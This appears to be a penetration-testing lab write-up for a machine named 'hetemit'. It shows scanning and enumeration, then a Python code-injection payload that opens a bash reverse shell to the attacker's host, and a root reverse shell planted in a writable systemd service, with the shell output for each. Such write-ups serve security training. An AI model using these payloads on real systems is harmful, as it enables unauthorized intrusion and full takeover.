 
# Export
```md
export IP="192.168.101.117"
export URL="http://192.168.101.117:80/FUZZ"
```

<hr>

# RCE
+ `/verify` endpoint with vulnerable parameter `code`.

Payload:
```bash
POST /verify HTTP/1.1
Host: 192.168.101.117:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _register_hetemit_session=GK6KJri2ylafDgK%2F6lIyUBw9ZFUG2JwfR2XUy%2Be%2BBxow52YsWOyvti%2FQ4YVuCMMzuGNZB%2FMy4NXQxqDQ%2FeNGm5IQFQW7f94Ou4PByd3u2B7pqfMazR0jVFdSF5vBSV4vUo0J5ZT%2FhHql%2BaR5TKp%2BAnKBITheUGIE7AHyAEbvc%2B5KeSFsQ5mdZrJz46COTOZXBdmvfLlMIEisXpzZPwA3uTow5ziDY54D2MrJDVtpCFQ5YWqaEZeSb0js5JggvLZF7K26sxfSr17MsEphdt%2FopNZxNR4kckDId5%2FsUV9Yla%2Bc--0LA3avph4XEwY4vn--zaptbla4hpI7tLNc87OpLw%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 90

code=__import__("os").system("bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.101/80+0>%261'")
```

```md
nc -nlvp 80
listening on [any] 80 ...
connect to [192.168.49.101] from (UNKNOWN) [192.168.101.117] 43194
bash: cannot set terminal process group (1400): Inappropriate ioctl for device
bash: no job control in this shell
[cmeeks@hetemit restjson_hetemit]$ whoami
whoami
cmeeks
[cmeeks@hetemit restjson_hetemit]$ id
id
uid=1000(cmeeks) gid=1000(cmeeks) groups=1000(cmeeks)
```

<hr>

# Privilege Escalation
```md
[cmeeks@hetemit restjson_hetemit]$ ls -al /etc/systemd/system/pythonapp.service
-rw-rw-r-- 1 root cmeeks 326 Aug 20 06:02 /etc/systemd/system/pythonapp.service
```

```md
...
[Service]                                     
Type=simple                   
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=bash -c 'bash -i >& /dev/tcp/192.168.49.101/18000 0>&1'
TimeoutSec=30                             
RestartSec=15s                                
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure
...
```

```bash
$ nc -nlvp 18000                                                                                                                                                                      130 ⨯
listening on [any] 18000 ...
connect to [192.168.49.101] from (UNKNOWN) [192.168.101.117] 42660
bash: cannot set terminal process group (1211): Inappropriate ioctl for device
bash: no job control in this shell
[root@hetemit restjson_hetemit]# whoami
whoami
root
[root@hetemit restjson_hetemit]# id
id
uid=0(root) gid=0(root) groups=0(root)
```

<hr>

# Nmap
```bash
$ nmap --open -sV -A -p- -vv -n -Pn -oA nmap/services 192.168.118.117
PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 63 vsftpd 3.0.3
22/tcp    open  ssh         syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http        syn-ack ttl 63 Apache httpd 2.4.37 ((centos))
139/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
18000/tcp open  biimenu?    syn-ack ttl 63
50000/tcp open  http        syn-ack ttl 63 Werkzeug httpd 1.0.1 (Python 3.6.8)
```

<hr>

# Web Application

#### Port 80
```bash
cgi-bin/                [Status: 403, Size: 217, Words: 16, Lines: 10]
noindex                 [Status: 301, Size: 239, Words: 14, Lines: 8]
```


#### Port 18000
+ Protomba?
+ Valid user: `cmeeks`


#### Port 50000
```md
/generate
/verify
```

+ Parameters pentesting checklists:

~~Random characters~~
~~Python/Python  + Base64~~
~~PHP~~
~~Bash/Bash + Base64~~
~~LFI/RFI~~
~~SSTI~~
~~SQLi~~
~~XSS~~

If GET request doesn't work → try POST.
+ Request:

```md
POST /generate HTTP/1.1
Host: 192.168.101.117:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _register_hetemit_session=GK6KJri2ylafDgK%2F6lIyUBw9ZFUG2JwfR2XUy%2Be%2BBxow52YsWOyvti%2FQ4YVuCMMzuGNZB%2FMy4NXQxqDQ%2FeNGm5IQFQW7f94Ou4PByd3u2B7pqfMazR0jVFdSF5vBSV4vUo0J5ZT%2FhHql%2BaR5TKp%2BAnKBITheUGIE7AHyAEbvc%2B5KeSFsQ5mdZrJz46COTOZXBdmvfLlMIEisXpzZPwA3uTow5ziDY54D2MrJDVtpCFQ5YWqaEZeSb0js5JggvLZF7K26sxfSr17MsEphdt%2FopNZxNR4kckDId5%2FsUV9Yla%2Bc--0LA3avph4XEwY4vn--zaptbla4hpI7tLNc87OpLw%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

email=whoami
```

+ Response:

```md
HTTP/1.0 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 290
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Fri, 20 Aug 2021 05:01:07 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```
